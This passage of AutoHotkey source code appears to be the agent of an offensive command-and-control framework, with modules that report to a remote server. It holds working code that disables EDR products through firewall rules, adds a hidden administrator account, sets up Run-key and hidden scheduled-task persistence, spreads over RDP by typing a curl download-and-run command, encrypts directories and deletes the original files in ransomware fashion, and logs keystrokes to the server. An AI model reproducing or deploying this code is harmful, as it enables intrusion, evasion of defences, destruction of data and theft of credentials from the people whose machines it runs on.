            DllCall("Ws2_32\setsockopt", "Ptr", sock, "Int", 0xFFFF, "Int", 0x1006, "Ptr", timeout, "Int", 4)
    
            ; Create sockaddr structure
            sockaddr := Buffer(16, 0)
            NumPut("UShort", AF_INET, sockaddr, 0)
            NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
            NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", ip), sockaddr, 4)
    
            ; Try to connect
            result := DllCall("Ws2_32\connect", "Ptr", sock, "Ptr", sockaddr, "Int", 16)
            
            ; Get error code if connection failed
            error := 0
            if (result = SOCKET_ERROR) {
                error := DllCall("Ws2_32\WSAGetLastError")
            }
    
            ; Clean up
            DllCall("Ws2_32\closesocket", "Ptr", sock)
            DllCall("Ws2_32\WSACleanup")
    
            ; Return appropriate status
            if (result = 0)
                return "open"
            else if (error = WSAECONNREFUSED)
                return "closed"
            else if (error = WSAETIMEDOUT)
                return "filtered"
            else
                return "filtered"
        }
    }

    DenyOutboundFirewall(targets := ["csfalconservice, sentinelone, cylancesvc, SEDservice"]){
        if A_IsAdmin {
            matchingFiles := FindEDRFiles("C:\Program Files")
            
            if matchingFiles.Length > 0 {
    
                data := ("Found " matchingFiles.Length " matching files`n")
                message := Format("command_output|{}|{}", this.agentID, data)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
                
                ; Create a string combining all file paths
                fileList := ""
                for filePath in matchingFiles {
                    fileList .= filePath "`n"  ; Append each file path followed by newline
                }
                
                ; Combine the count message with the file list
                data .= fileList
    
                ; Process each found file
                for filePath in matchingFiles {
                    ; Extract filename
                    SplitPath filePath, &fileName
                    
                    ; Create and execute netsh command
                    netshCommand := 'netsh advfirewall firewall add rule name="Deny Outbound for ' fileName '" dir=out action=block program="' filePath '" enable=yes'
                    
                    try {
                        RunWait netshCommand,, "Hide"
                        data .= "Successfully added firewall rule for: " fileName "`n"
                    } catch Error as err {
                        data .= "Error adding firewall rule for " fileName ": " err.Message " at line " err.Line
                    }
                }
    
                message := Format("command_output|{}|{}", this.agentID, data)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
                
            } else {
                data := ("No matching files found in Program Files")
                message := Format("command_output|{}|{}", this.agentID, data)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
            }
        } else {
                message := Format("command_output|{}|This module must be run as Admin", this.agentID)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    
        IsTargetFile(filename) {
            ; Convert filename to lowercase for case-insensitive comparison
            filename := StrLower(filename)
            
            ; Extract basename (remove extension)
            SplitPath filename,,, , &baseName
            baseName := StrLower(baseName)
            
            ; Check if basename matches any target
            for target in targets {
                if (baseName = target)
                    return true
            }
            return false
        }
        
        FindEDRFiles(searchPath) {
            matchingFiles := []
            
            try {
                ; Recursive search through Program Files
                Loop Files, searchPath "\*.exe", "R"  ; R for recursive
                {
                    if IsTargetFile(A_LoopFileName) {
                        matchingFiles.Push(A_LoopFileFullPath)
                    }
                }
            } catch Error as err {
                ; TODO: Add error handling for agent execution.
            }
            
            return matchingFiles
        }
    }

    HostFileURLBlock(domains := ["example1.com", "example2.com", "example3.com"], redirectIP:= "127.0.0.1"){

        hostFile := A_WinDir "\System32\drivers\etc\hosts"
    
        if A_IsAdmin {
    
            fileHandle := ""
    
            ; Open the hosts file in append mode
            fileHandle := FileOpen(hostFile, "a")
    
            ; Write domain entries to the hosts file
            try {
                for domain in domains {
                    fileHandle.WriteLine(redirectIP . " " . domain)
                    fileHandle.WriteLine(redirectIP . " www." . domain)
                    data .= "`nSuccessfully added entries for: " domain
                }
                message := Format("command_output|{}|{}", this.agentID, data)
                response := this.SendMsg(this.serverIP, this.serverPort, message)

            } catch as err {
                message := Format("command_output|{}|Module failed: {}", this.agentID, err.Message)
                response := this.SendMsg(this.serverIP, this.serverPort, message)

            } finally {
                if fileHandle {
                    fileHandle.Close()  ; Ensure the file is closed even if an error occurs
                }
            }
        } else {
            message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            }
    }

    RunAsUser(username := "default", password := "default") {

        targetPath := A_ScriptFullPath
        ; Get public directory path
        publicDir := EnvGet("PUBLIC") "\Temp"
        
        ; Create temp directory if it doesn't exist
        if !DirExist(publicDir) {
            DirCreate(publicDir)
        }
        
        ; Copy AutoHotkey executable
        ahkExePath := A_AhkPath
        ahkExeName := "AutoHotkey64.exe"  ; 
        newExePath := publicDir "\" ahkExeName
        
        FileCopy ahkExePath, newExePath, 1  ; 1 = overwrite
        
        ; Copy script file
        scriptName := "tempScript.ahk"
        newScriptPath := publicDir "\" scriptName
        
        FileCopy targetPath, newScriptPath, 1
        
        ; Launch copied script with the executable
        try {
            
            si := Buffer(A_PtrSize = 8 ? 104 : 68, 0)
            NumPut("UInt", si.Size, si)
            pi := Buffer(A_PtrSize = 8 ? 24 : 16, 0)
            
            commandLine := Format('"{1}" "{2}"', newExePath, newScriptPath)
            
            result := DllCall("advapi32\CreateProcessWithLogonW"
                , "Str", username
                , "Ptr", 0
                , "Str", password
                , "UInt", 1
                , "Str", newExePath          ; Application name
                , "Str", commandLine         ; Command line
                , "UInt", 0x00000010
                , "Ptr", 0
                , "Str", publicDir
                , "Ptr", si
                , "Ptr", pi)
                
            if (!result) {
                lastError := DllCall("GetLastError")
                message := Format("command_output|{}|Execution failed, error: {}", this.agentID, lastError)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
                return false
            }

            DllCall("CloseHandle", "Ptr", NumGet(pi, 0, "Ptr"))
            DllCall("CloseHandle", "Ptr", NumGet(pi, A_PtrSize, "Ptr"))

            message := Format("command_output|{}|Execution successful", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)

            return true
            
        } catch Error as err {
            message := Format("command_output|{}|Execution failed, error: {}", this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    UpdateCheckIn(interval){
        this.Log( (interval * 1000))
        this.checkInInterval :=  (interval * 1000)
        this.StopCheckInLoop()
        this.StartCheckInLoop()
    }

    AddAdminUser(username := "TestUser", password := "P@ssw0rd123!", fullname := "Test User") {
        ; Constants
        UF_SCRIPT := 0x0001
        UF_NORMAL_ACCOUNT := 0x0200
        
        ; Load DLL
        hNetApi32 := DllCall("LoadLibrary", "Str", "Netapi32.dll", "Ptr")
        
        ; Requires admin
        if A_IsAdmin {
            
            ; Error code mapping
            ERROR_CODES := Map(
                2224, "The specified user account already exists.",
                2245, "The password does not meet the password policy requirements.",
                2226, "The user name or group name parameter is too long.",
                2202, "The specified username is invalid.",
                1378, "The specified local group already exists.",
                5, "Access denied.",
                87, "Invalid parameter.",
                8, "Not enough memory.",
                123, "Invalid name.",
                124, "Invalid level."
            )
            
            CreateLocalUser(username, password, fullname) {
                This.log("Starting CreateLocalUser function")
                
                try {
                    structSize := A_PtrSize * 6 + 4 * 2
                    userInfo := Buffer(structSize, 0)
                    
                    This.log("Created userInfo buffer of size: " userInfo.Size)
                    
                    offsets := Map(
                        "name", 0,
                        "password", A_PtrSize,
                        "password_age", A_PtrSize * 2,
                        "priv", A_PtrSize * 2 + 4,
                        "home_dir", A_PtrSize * 3,
                        "comment", A_PtrSize * 4,
                        "flags", A_PtrSize * 5,
                        "script_path", A_PtrSize * 5 + 4
                    )
                    
                    For field, offset in offsets {
                        This.log("Field '" field "' offset: " offset)
                        if (offset + (InStr(field, "age") || InStr(field, "priv") || InStr(field, "flags") ? 4 : A_PtrSize) > structSize) {
                            throw Error("Field '" field "' would exceed buffer size")
                        }
                    }
                    
                    usernamePtr := StrPtr(username)
                    passwordPtr := StrPtr(password)
                    
                    This.log("Writing structure fields...")
                    NumPut("Ptr", usernamePtr, userInfo, offsets["name"])
                    NumPut("Ptr", passwordPtr, userInfo, offsets["password"])
                    NumPut("UInt", 0, userInfo, offsets["password_age"])
                    NumPut("UInt", 1, userInfo, offsets["priv"])
                    NumPut("Ptr", 0, userInfo, offsets["home_dir"])
                    NumPut("Ptr", 0, userInfo, offsets["comment"])
                    NumPut("UInt", UF_SCRIPT|UF_NORMAL_ACCOUNT, userInfo, offsets["flags"])
                    NumPut("Ptr", 0, userInfo, offsets["script_path"])
                    
                    This.log("Structure contents:")
                    For field, offset in offsets {
                        value := NumGet(userInfo, offset, InStr(field, "age") || InStr(field, "priv") || InStr(field, "flags") ? "UInt" : "Ptr")
                        This.log("  " field ": 0x" format("{:X}", value))
                    }
                    
                    parmError := Buffer(4, 0)
                    
                    This.log("Calling NetUserAdd...")
                    result := DllCall("Netapi32\NetUserAdd",
                        "Ptr", 0,
                        "UInt", 1,
                        "Ptr", userInfo.Ptr,
                        "Ptr", parmError.Ptr)
                    
                    if (result != 0) {
                        lastError := DllCall("GetLastError")
                        This.log("API Error - Result: " result ", LastError: " lastError ", ParmError: " NumGet(parmError, 0, "UInt"))
                        errorMessage := ERROR_CODES.Has(result) ? ERROR_CODES[result] : "Unknown error (" result ")"
                        throw Error("Failed to create user: " errorMessage)
                    }
                    
                    This.log("User creation successful")
                    return true
                    
                } catch Error as err {
                    This.log("Error: " err.Message)
                    if (err.Extra)
                        This.log("Extra info: " err.Extra)
                    return false
                }
            }
            
            AddUserToAdminGroup(username) {
                This.log("Starting AddUserToAdminGroup for user: " username)
                
                try {
                    memberInfo := Buffer(A_PtrSize, 0)
                    usernamePtr := StrPtr(username)
                    NumPut("Ptr", usernamePtr, memberInfo, 0)
                    
                    This.log("Calling NetLocalGroupAddMembers...")
                    This.log("  Username ptr: " format("0x{:X}", usernamePtr))
                    This.log("  Buffer ptr: " format("0x{:X}", memberInfo.Ptr))
                    
                    result := DllCall("Netapi32\NetLocalGroupAddMembers",
                        "Ptr", 0,
                        "Str", "Administrators",
                        "UInt", 3,
                        "Ptr", memberInfo.Ptr,
                        "UInt", 1,
                        "UInt")
                    
                    lastError := A_LastError
                    This.log("NetLocalGroupAddMembers result: " result)
                    This.log("LastError: " lastError)
                    
                    if (result != 0) {
                        errorMessage := ""
                        switch result {
                            case 1377: errorMessage := "User is already a member of the group"
                            case 1378: errorMessage := "Administrators group not found"
                            case 1387: errorMessage := "User account not found"
                            case 1388: errorMessage := "Invalid user account"
                            case 5: errorMessage := "Access denied"
                            default: errorMessage := "Unknown error: " result
                        }
                        throw Error("Failed to add user to Administrators group: " errorMessage, -1, result)
                    }
                    
                    This.log("Successfully added user to Administrators group")
                    return true
                    
                } catch Error as err {
                    This.log("Error adding user to group: " err.Message " (Code: " err.Extra ")")
                    return false
                }
            }
            
            if CreateLocalUser(username, password, fullname) {
                if AddUserToAdminGroup(username) {
                    DllCall("FreeLibrary", "Ptr", hNetApi32)
                    message := Format("command_output|{}|{} created and added to Admin group", this.agentID, username)
                    response := this.SendMsg(this.serverIP, this.serverPort, message)
                    return true
                }
            }
            
            DllCall("FreeLibrary", "Ptr", hNetApi32)
            return false

        } else {
            message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    }

    AddScriptToRegistry(valueName := "StartUp") {
        subKey := "Software\Microsoft\Windows\CurrentVersion\Run"
        scriptPath := A_ScriptFullPath
        exePath := A_AhkPath
        value := Format( '"{}" "{}"', exePath, scriptPath)
        RegWrite(value, "REG_SZ", "HKEY_CURRENT_USER\" subKey, valueName)
        message := Format("command_output|{}|Registry key created successfully", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    CreateScheduledTask(taskName := "ScheduledTask", executable := "", delayHours := 24) {
        try {
            ; Set default executable to current script if none provided
            if (executable = "") {
                scriptPath := A_ScriptFullPath
                exePath := A_AhkPath
                executable := Format('"{}" "{}"', exePath, scriptPath)
            }
            
            scheduler := ComObject("Schedule.Service")
            scheduler.Connect()
            
            rootFolder := scheduler.GetFolder("\")
            
            taskDef := scheduler.NewTask(0)
            
            taskDef.RegistrationInfo.Description := "Updater"
            
            if A_IsAdmin {
                taskDef.Principal.RunLevel := 1
                userId := "SYSTEM"
                logonType := 5  ; TASK_LOGON_SERVICE_ACCOUNT
            } else {
                taskDef.Principal.RunLevel := 0
                userId := A_UserName
                logonType := 3  ; TASK_LOGON_INTERACTIVE_TOKEN
            }
            
            triggers := taskDef.Triggers
            trigger := triggers.Create(2)  ; TASK_TRIGGER_DAILY
            
            startTime := DateAdd(A_Now, delayHours, "hours")
            trigger.StartBoundary := FormatTime(startTime, "yyyy-MM-ddTHH:mm:ss")
            trigger.Enabled := true
            
            trigger.DaysInterval := 1  ; Repeat every 1 day
            
            actions := taskDef.Actions
            action := actions.Create(0)  ; TASK_ACTION_EXEC

            ; Parse executable and arguments
            if InStr(executable, '"') {
                ; Extract path and arguments from quoted string
                parts := StrSplit(executable, '"',, 3)  ; Split into max 3 parts
                action.Path := parts[2]  ; The path is the second part (between quotes)
                action.Arguments := Trim(parts[3])  ; Everything after the closing quote
            } else {
                ; No quotes - split on first space
                spacePos := InStr(executable, " ")
                if spacePos {
                    action.Path := SubStr(executable, 1, spacePos - 1)
                    action.Arguments := Trim(SubStr(executable, spacePos + 1))
                } else {
                    action.Path := executable
                    action.Arguments := ""
                }
            }
            
            taskDef.Settings.Enabled := true
            taskDef.Settings.Hidden := true
            taskDef.Settings.AllowDemandStart := true
            taskDef.Settings.StartWhenAvailable := true
            
            ; Register task
            rootFolder.RegisterTaskDefinition(
                taskName,           ; Task name
                taskDef,           ; Task definition
                6,                 ; TASK_CREATE_OR_UPDATE
                userId,            ; User account
                ,                  ; Password (empty)
                logonType          ; Logon type
            )
            
            message := Format("command_output|{}|Scheduled task created successfully", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
                
            return true
            
        } catch as err {
            message := Format("command_output|{}|Error creating scheduled task: {}", this.agentID, err.Message)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return false
        }
    }

    InstallMSI(url := "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.82-installer.msi", downloadPath := A_Temp "\putty-installer.msi", installDir := (A_AppData "\PuTTY")) {
        
        if A_IsAdmin{
            ; Create installation directory if it doesn't exist
            if !DirExist(installDir)
                DirCreate(installDir)
            
            ; Download the installer
            Download(url, downloadPath)
            
            ; Run installer with user-level installation parameters
            installCmd := 'msiexec.exe /i "' downloadPath '" /qn'
                . ' ALLUSERS=""'
                . ' MSIINSTALLPERUSER=1'
                . ' INSTALLDIR="' installDir '"'
            
            result := RunWait(installCmd)
            
            ; Clean up
            FileDelete(downloadPath)
            
            message := Format("command_output|{}|{}", this.agentID, result)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        } else {
            message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
        return result
    }

    RDPConnect(hostname, username, password, serverIP, domain := "") {
        ; Define full system paths
        rdpFile := A_Temp "\temp.rdp"
        mstscPath := A_WinDir "\System32\mstsc.exe"
        cmdKeyPath := A_WinDir "\System32\cmdkey.exe"
        
        ; Build RDP content
        rdpSettings := [
            "screen mode id:i:2",
            "use multimon:i:0",
            "desktopwidth:i:1920",
            "desktopheight:i:1080",
            "session bpp:i:32",
            "winposstr:s:0,1,0,0,800,600",
            "compression:i:1",
            "keyboardhook:i:2",
            "audiocapturemode:i:0",
            "videoplaybackmode:i:1",
            "connection type:i:7",
            "networkautodetect:i:1",
            "bandwidthautodetect:i:1",
            "displayconnectionbar:i:1",
            "username:s:" username,
            "full address:s:" hostname,
            "prompt for credentials:i:0",
            "authentication level:i:0"
        ]
        
        if domain
            rdpSettings.Push("domain:s:" domain)
        
        rdpContent := ""
        for setting in rdpSettings
            rdpContent .= setting "`n"
    
        ; Write RDP file
        if FileExist(rdpFile)
            FileDelete(rdpFile)
            
        FileAppend(rdpContent, rdpFile)
        
        ; Store creds
        cmdLine := '"' cmdKeyPath '" /generic:"' hostname '" /user:"' username '" /pass:"' password '"'
        RunWait(cmdLine,, "Hide")
        
        ; Launch RDP
        Run('"' mstscPath '" "' rdpFile '"')
        
        ; Clean up RDP file after delay
        SetTimer(() => (FileExist(rdpFile) ? FileDelete(rdpFile) : ""), -5000)
        
        Sleep(500)
    
        ; bypass insecure notification
        Send("{Left}{Enter}") 
    
        ; Wait for and activate the RDP window
        WinWait("temp - " hostname " - Remote Desktop Connection", ,Timeout := 15000)
        WinActivate("temp - " hostname " - Remote Desktop Connection")
        Sleep(2500)
        ; Send Windows+X, then r for run
        Send("#x")
        Sleep(300)  ; Small delay to ensure menu appears
        Send("r")
        Sleep(500)  ; Delay to allow window to open
        Send("{Backspace}")
        Send("cmd")
        Send("{Enter}")
        Sleep(800) ; Delay to allow window to open
        Send(Format('{Text}curl -L -o ahk.exe https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe && ahk.exe /silent /installto %USERPROFILE%\AppData\Local\Programs\AutoHotkey && timeout 3 && curl -L -o script.ahk https://raw.githubusercontent.com/CroodSolutions/AutoPwnKey/refs/heads/main/1%20-%20Covert%20Malware%20Delivery%20and%20Ingress%20Tool%20Transfer/AutoPwnKey-agent.ahk && timeout 3 && %USERPROFILE%\AppData\Local\Programs\AutoHotkey\v2\AutoHotkey64.exe script.ahk {}', serverIP))
        Sleep(300)
        Send("{Enter}")
        Sleep(300)
        Send("#{Down}") ; Minimize cmd
        Sleep(10000)
        ;Send("#{Up}")
        ;Send("!{F4}")
        
        message := Format("command_output|{}|Module finished execution, check for new agent.", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

        return true
    } 

    EncryptDirectory(targetFolder, password) {

        Encrypt(data, password) {
            ; Create a buffer from the input data (assuming it's binary)
            dataBuffer := Buffer(data.Size)
            dataBuffer.Size := data.Size
            dataBuffer := data  ; Copy the binary data
            
            ; Create crypto provider and hash
            hProvider := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptAcquireContext", "Ptr", hProvider.Ptr, "Ptr", 0, "Ptr", 0, "UInt", 1, "UInt", 0xF0000000))
                throw Error("Failed to acquire crypto context", -1)
            
            hHash := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptCreateHash", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x8003, "Ptr", 0, "UInt", 0, "Ptr", hHash.Ptr))
                throw Error("Failed to create hash", -1)
            
            ; Hash the password
            pwSize := StrPut(password, "UTF-8") - 1
            pwBuffer := Buffer(pwSize)
            StrPut(password, pwBuffer, "UTF-8")
            
            if !DllCall("Advapi32\CryptHashData", "Ptr", NumGet(hHash, 0, "Ptr"), "Ptr", pwBuffer.Ptr, "UInt", pwSize, "UInt", 0)
                throw Error("Failed to hash password", -1)
            
            ; Create encryption key
            hKey := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptDeriveKey", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x6801, "Ptr", NumGet(hHash, 0, "Ptr"), "UInt", 1, "Ptr", hKey.Ptr))
                throw Error("Failed to create key", -1)
            
            ; Calculate required buffer size for encrypted data
            encryptedSize := data.Size
            if !DllCall("Advapi32\CryptEncrypt", "Ptr", NumGet(hKey, 0, "Ptr"), "Ptr", 0, "Int", 1, "UInt", 0, "Ptr", 0, "UInt*", &encryptedSize, "UInt", data.Size)
                throw Error("Failed to calculate encryption size", -1)
            
            ; Create properly sized buffer and encrypt the data
            encrypted := Buffer(encryptedSize)
            encrypted.Size := encryptedSize
            encrypted := data  ; Copy original data
            finalSize := data.Size
            
            if !DllCall("Advapi32\CryptEncrypt", "Ptr", NumGet(hKey, 0, "Ptr"), "Ptr", 0, "Int", 1, "UInt", 0, "Ptr", encrypted.Ptr, "UInt*", &finalSize, "UInt", encrypted.Size)
                throw Error("Encryption failed", -1)
            
            ; Clean up
            DllCall("Advapi32\CryptDestroyKey", "Ptr", NumGet(hKey, 0, "Ptr"))
            DllCall("Advapi32\CryptDestroyHash", "Ptr", NumGet(hHash, 0, "Ptr"))
            DllCall("Advapi32\CryptReleaseContext", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0)
            
            return encrypted
        }

        if !targetFolder OR !password{
            message := Format("command_output|{}|No parameters provided.", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return
        }
    
        ;main execution
        Loop Files, targetFolder "\*.*", "FR"
        {
            if (StrLower(SubStr(A_LoopFileName, -9)) = ".encrypted")
                continue
                
            this.Log("Processing: " A_LoopFileName "`n")
            
            ; Read the original file as binary
            fileObj := FileOpen(A_LoopFileFullPath, "r-d")  ; binary mode
            if !fileObj {
                this.Log("Failed to open file`n")
                continue
            }
            
            fileSize := fileObj.Length
            fileBuffer := Buffer(fileSize)
            fileSize := fileObj.Length
            if (fileSize <= 0) {
                this.Log("Invalid file size for: " A_LoopFileName)
                fileObj.Close()
                continue
            }
            
            fileBuffer := Buffer(fileSize)
            if (!fileBuffer) {
                this.Log("Failed to create buffer for: " A_LoopFileName)
                fileObj.Close()
                continue
            }
            
            ; Then attempt the read
            if (!fileObj.RawRead(fileBuffer)) {
                this.Log("Failed to read file: " A_LoopFileName)
                fileObj.Close()
                continue
            }
            fileObj.Close()
            
            ; Encrypt the data
            encryptedData := Encrypt(fileBuffer, password)
            
            ; Keep original extension and append .encrypted
            newPath := A_LoopFileFullPath ".encrypted"
            
            ; Write encrypted data
            fileObj := FileOpen(newPath, "w-d")  ; write in binary mode
            if fileObj {
                fileObj.RawWrite(encryptedData, encryptedData.Size)
                fileObj.Close()
                FileDelete(A_LoopFileFullPath)
                this.Log("Successfully encrypted to: " newPath "`n")
            }
        }
        message := Format("command_output|{}|Encryption completed.", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    DecryptDirectory(targetFolder, password) {

        Decrypt(encryptedBuffer, password) {
            ; Create crypto provider and hash
            hProvider := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptAcquireContext", "Ptr", hProvider.Ptr, "Ptr", 0, "Ptr", 0, "UInt", 1, "UInt", 0xF0000000))
                throw Error("Failed to acquire crypto context", -1)
            
            hHash := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptCreateHash", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x8003, "Ptr", 0, "UInt", 0, "Ptr", hHash.Ptr))
                throw Error("Failed to create hash", -1)
            
            ; Hash the password
            pwSize := StrPut(password, "UTF-8") - 1
            pwBuffer := Buffer(pwSize)
            StrPut(password, pwBuffer, "UTF-8")
            
            if !DllCall("Advapi32\CryptHashData", "Ptr", NumGet(hHash, 0, "Ptr"), "Ptr", pwBuffer.Ptr, "UInt", pwSize, "UInt", 0)
                throw Error("Failed to hash password", -1)
            
            ; Create decryption key
            hKey := Buffer(A_PtrSize)
            if !(DllCall("Advapi32\CryptDeriveKey", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0x6801, "Ptr", NumGet(hHash, 0, "Ptr"), "UInt", 1, "Ptr", hKey.Ptr))
                throw Error("Failed to create key", -1)
            
            ; Decrypt the data
            decryptedSize := encryptedBuffer.Size
            decrypted := Buffer(decryptedSize)
            decrypted.Size := decryptedSize
            decrypted := encryptedBuffer  ; Copy the encrypted data
            
            if !DllCall("Advapi32\CryptDecrypt", "Ptr", NumGet(hKey, 0, "Ptr"), "Ptr", 0, "Int", 1, "UInt", 0, "Ptr", decrypted.Ptr, "UInt*", &decryptedSize)
                throw Error("Decryption failed", -1)
            
            ; Clean up
            DllCall("Advapi32\CryptDestroyKey", "Ptr", NumGet(hKey, 0, "Ptr"))
            DllCall("Advapi32\CryptDestroyHash", "Ptr", NumGet(hHash, 0, "Ptr"))
            DllCall("Advapi32\CryptReleaseContext", "Ptr", NumGet(hProvider, 0, "Ptr"), "UInt", 0)
            
            ; Return the buffer directly instead of converting to string
            decrypted.Size := decryptedSize  ; Update the buffer size to the decrypted size
            return decrypted
        }

        Loop Files, targetFolder "\*.encrypted", "FR"
            {
                this.Log("Processing: " A_LoopFileName "`n")
                
                ; Read the encrypted file
                fileObj := FileOpen(A_LoopFileFullPath, "r-d")
                if !fileObj {
                    this.Log("Failed to open file`n")
                    continue
                }
                
                fileSize := fileObj.Length
                if (fileSize <= 0) {
                    this.Log("Invalid file size for: " A_LoopFileName "`n")
                    fileObj.Close()
                    continue
                }
        
                encryptedBuffer := Buffer(fileSize)
                if (!encryptedBuffer) {
                    this.Log("Failed to create buffer for: " A_LoopFileName "`n")
                    fileObj.Close()
                    continue
                }
        
                if (!fileObj.RawRead(encryptedBuffer)) {
                    this.Log("Failed to read file: " A_LoopFileName "`n")
                    fileObj.Close()
                    continue
                }
        
                fileObj.Close()
                
                try {
                    ; Remove .encrypted from the path
                    newPath := SubStr(A_LoopFileFullPath, 1, -10)  ; Remove ".encrypted"
                    
                    ; Decrypt the data
                    decryptedData := Decrypt(encryptedBuffer, password)
                    
                    ; Write the decrypted data
                    fileObj := FileOpen(newPath, "w-d")  ; write in binary mode
                    if fileObj {
                        fileObj.RawWrite(decryptedData, decryptedData.Size)
                        fileObj.Close()
                        FileDelete(A_LoopFileFullPath)
                        this.Log("Successfully decrypted to: " newPath "`n")
                    }
                } catch Error as err {
                    this.Log("Error: " err.Message "`n")
                }
            }
        message := Format("command_output|{}|Decryption completed.", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

    KeyLogger(action) {
        
        if (action = "start" && !this.loggerisRunning) {
            this.Log("Keylogger starting...")
            this.loggerisRunning := true
            SetTimer(Logger, -1)  ; Keep the -1 for background operation
        } 
        if (action = "stop" && this.loggerisRunning) {
            this.loggerisRunning := false
            if this.loggerIH {
                this.Log("Keylogger stopping...")
                this.loggerIH.Stop()
                this.loggerIH := ""
            }
        }
        
        Logger() {
            if !this.loggerisRunning  ; Exit if stopped
                return
                
            if this.loggerIH    ; Don't create multiple instances
                return
        
            ; Initialize state variables within the function scope
            lastWindow := ""
            
            ; Helper functions
            GetActiveWindowTitle() {
                return WinGetTitle("A")
            }
            
            GetTimestamp() {
                return FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
            }
            
            SendLoggerData(data) {
                message := Format("keylogger_output|{}|{}", this.agentID, data)

                this.Log("Sending: " . message)  ; Debug log
                return this.SendMsg(this.serverIP, this.serverPort, message)
            }
            
            ; Create input hook with specific options
            ih := InputHook()
            ih.MinSendLevel := 2  ; Ignore artificial keystrokes
            ih.KeyOpt("{All}", "V")  ; V for visible
            ih.KeyOpt("{Enter}", "V")  ; Explicitly capture Enter key
            ih.KeyOpt("{Tab}", "V")    ; Explicitly capture Tab key
            ih.KeyOpt("{Backspace}", "V") ; Explicitly capture Backspace

            
            ; Define keystroke handler
            OnKeyPressed(ih, key) {
                try {
                    currentWindow := GetActiveWindowTitle()
                    
                    if (currentWindow != lastWindow) {
                        lastWindow := currentWindow
                        timestamp := GetTimestamp()
                        SendLoggerData(Format("%0A[{}] ({})%0A", currentWindow, timestamp))
                    }
                    
                    ; Handle regular keys
                    if (StrLen(key) = 1) {
                        if (GetKeyState("Shift", "P"))
                            key := StrUpper(key)
                        SendLoggerData(key)
                    }
                } catch Error as e {
                    SendLoggerData(Format("Error logging keystroke: {}`n", e.Message))
                }
            }
    
            Hotkey("~Enter", (*) => SendLoggerData("%0A"))
            Hotkey("~Space", (*) => SendLoggerData("%20"))
            Hotkey("~Tab", (*) => SendLoggerData("%09"))
            Hotkey("~Backspace", (*) => SendLoggerData("%08"))

            Hotkey("~^c", (*) => SendLoggerData("[Ctrl+C]"))
            Hotkey("~^v", (*) => SendLoggerData("[Ctrl+V]"))
            Hotkey("~^x", (*) => SendLoggerData("[Ctrl+X]"))
            Hotkey("~^z", (*) => SendLoggerData("[Ctrl+Z]"))
            Hotkey("~^y", (*) => SendLoggerData("[Ctrl+Y]"))  ; Redo
            Hotkey("~^a", (*) => SendLoggerData("[Ctrl+A]"))
            Hotkey("~^s", (*) => SendLoggerData("[Ctrl+S]"))
            Hotkey("~^f", (*) => SendLoggerData("[Ctrl+F]"))  ; Find
            Hotkey("~^p", (*) => SendLoggerData("[Ctrl+P]"))  ; Print
            Hotkey("~^n", (*) => SendLoggerData("[Ctrl+N]"))  ; New
            Hotkey("~^o", (*) => SendLoggerData("[Ctrl+O]"))  ; Open
            Hotkey("~^w", (*) => SendLoggerData("[Ctrl+W]"))  ; Close tab/window
            Hotkey("~^t", (*) => SendLoggerData("[Ctrl+T]"))  ; New tab
            Hotkey("~^+t", (*) => SendLoggerData("[Ctrl+Shift+T]"))  ; Reopen closed tab
            
            ; Function keys
            Hotkey("~F1", (*) => SendLoggerData("[F1]"))
            Hotkey("~F2", (*) => SendLoggerData("[F2]"))
            Hotkey("~F3", (*) => SendLoggerData("[F3]"))
            Hotkey("~F4", (*) => SendLoggerData("[F4]"))
            Hotkey("~F5", (*) => SendLoggerData("[F5]"))
            Hotkey("~F11", (*) => SendLoggerData("[F11]"))  ; Full screen
            
            ; Alt combinations
            Hotkey("~!Tab", (*) => SendLoggerData("[Alt+Tab]"))
            Hotkey("~!F4", (*) => SendLoggerData("[Alt+F4]"))
            
            ; Windows key combinations
            Hotkey("~#l", (*) => SendLoggerData("[Win+L]"))  ; Lock
            Hotkey("~#d", (*) => SendLoggerData("[Win+D]"))  ; Show desktop
            Hotkey("~#e", (*) => SendLoggerData("[Win+E]"))  ; File explorer
            Hotkey("~#r", (*) => SendLoggerData("[Win+R]"))  ; Run
            
            ; Navigation keys
            Hotkey("~PgUp", (*) => SendLoggerData("[PgUp]"))
            Hotkey("~PgDn", (*) => SendLoggerData("[PgDn]"))
            Hotkey("~Home", (*) => SendLoggerData("[Home]"))
            Hotkey("~End", (*) => SendLoggerData("[End]"))
            
            ; Media keys
